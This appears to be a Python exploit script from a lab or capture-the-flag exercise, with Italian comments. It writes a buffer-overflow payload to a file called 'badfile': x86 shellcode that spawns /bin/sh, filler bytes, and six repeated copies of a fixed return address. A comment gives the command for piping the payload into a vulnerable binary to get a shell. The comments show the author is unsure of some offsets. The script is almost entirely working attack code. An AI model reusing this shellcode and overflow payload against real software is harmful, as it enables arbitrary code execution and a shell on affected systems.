#note: exploit 1 con shellcode

import os
import struct

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#**comando: cat badfile - | ./vuln

stringa = 0x0804a080 #info variables su peda perche` e` una var globale

padding = 60 - len(shellcode)

#questi sono i 120 caratteri dei due buffer in cui metto anche lo shellcode
payload = "A"*60 #ovvero riempio buffer1
payload += shellcode #metto lo shellcode all'inizio di buffer
payload += "A"*padding #poi padding e arrivo subito prima di p

#tramite peda si capisce che bisogna metterne 6 per andare su p e sul ret addr ????
#dopo lo shellcode ho capito che servono 6 indirizzi di stringa
payload += struct.pack("I", stringa)
payload += struct.pack("I", stringa)
payload += struct.pack("I", stringa)
payload += struct.pack("I", stringa)
payload += struct.pack("I", stringa)
payload += struct.pack("I", stringa)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()
